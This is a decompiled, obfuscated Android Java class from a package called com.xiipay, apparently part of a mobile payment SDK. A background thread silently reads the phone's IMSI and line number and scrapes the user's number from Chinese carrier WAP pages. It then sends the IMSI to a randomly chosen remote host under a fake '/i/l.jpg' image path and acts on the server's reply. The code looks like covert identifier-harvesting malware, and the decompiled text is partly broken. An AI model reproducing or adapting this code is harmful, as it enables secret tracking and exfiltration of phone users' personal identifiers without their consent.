package com.xiipay.a;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import java.io.File;
import java.util.List;
import java.util.Map;
import java.util.Random;

public final class f
  extends Thread
{
  public static String a = "";
  private Context b;
  
  public f(Context paramContext)
  {
    this.b = paramContext;
  }
  
  private static String a(Context paramContext, String paramString1, String paramString2)
    throws Exception
  {
    paramContext = new String(k.a(paramContext, paramString1));
    int i = paramContext.indexOf(paramString2);
    if (i != -1)
    {
      paramString1 = paramContext.substring(i + paramString2.length());
      paramContext = paramString1;
      if (paramString1.startsWith("+")) {
        paramContext = paramString1.substring(1);
      }
      paramString1 = paramContext;
      if (paramContext.startsWith("86")) {
        paramString1 = paramContext.substring(2);
      }
      if (paramString1.length() >= 11) {
        return paramString1.substring(0, 11);
      }
    }
    return null;
  }
  
  public final void run()
  {
    a = g.a(new File(this.b.getPackageResourcePath()));
    Object localObject1 = (TelephonyManager)this.b.getSystemService("phone");
    String str = ((TelephonyManager)localObject1).getSubscriberId();
    if ((str == null) || (str.length() != 15)) {}
    d localD;
    do
    {
      return;
      localD = new d(this.b);
    } while ((!localD.d()) || (!localD.c()));
    for (;;)
    {
      try
      {
        if ((String)localD.b().d().get(str) != null) {
          break;
        }
        localObject1 = ((TelephonyManager)localObject1).getLine1Number();
        if ((localObject1 != null) && (((String)localObject1).length() > 0)) {
          localD.b().a(str, (String)localObject1);
        }
        localObject1 = ((ConnectivityManager)this.b.getSystemService("connectivity")).getActiveNetworkInfo();
        if ((localObject1 == null) || (!((NetworkInfo)localObject1).isAvailable())) {
          break;
        }
        if ((((NetworkInfo)localObject1).getType() != 0) || (((NetworkInfo)localObject1).getExtraInfo().toLowerCase().indexOf("wap") == -1) || (k.a(str))) {
          break label265;
        }
        if (k.b(str))
        {
          localObject1 = a(this.b, "http://wap.118100.cn/i/app/mycrbt/list.do?wapv=12&cc=1730", "欢迎您");
          if (localObject1 == null) {
            break;
          }
          localD.b().a(str, (String)localObject1);
          return;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
      localObject3 = a(this.b, "http://wap.12530.com/client/wl.jsp?CH=group&ut=&qd=3040&pc=bj&np=214071_214193&ty=dd&v=2960", "手机号:");
      localObject2 = localObject3;
      if (localObject3 == null) {
        localObject2 = a(this.b, "http://js.i139.cn/pams/s.do?tl=14874", "phone=");
      }
    }
    label265:
    Object localObject2 = localD.b().b();
    localObject2 = "http://" + (String)((List)localObject2).get(new Random().nextInt(((List)localObject2).size())) + "/i/l.jpg";
    Object localObject3 = localD.a();
    byte[] arrayOfByte = str.getBytes();
    if (localD.e() == 0) {}
    for (boolean bool = true;; bool = false)
    {
      localObject2 = k.a((Context)localObject3, (String)localObject2, arrayOfByte, bool);
      if (localObject2 == null) {}
      for (localObject2 = null; localObject2 != null; localObject2 = new String((byte[])localObject2))
      {
        if (!((String)localObject2).startsWith("1,")) {
          break label401;
        }
        localObject2 = ((String)localObject2).substring(2);
        localD.b().a(str, (String)localObject2);
        return;
      }
      break;
      label401:
      i.a(((String)localObject2).substring(2), "GS:" + k.c(str));
      k.b(10);
      return;
    }
  }
}
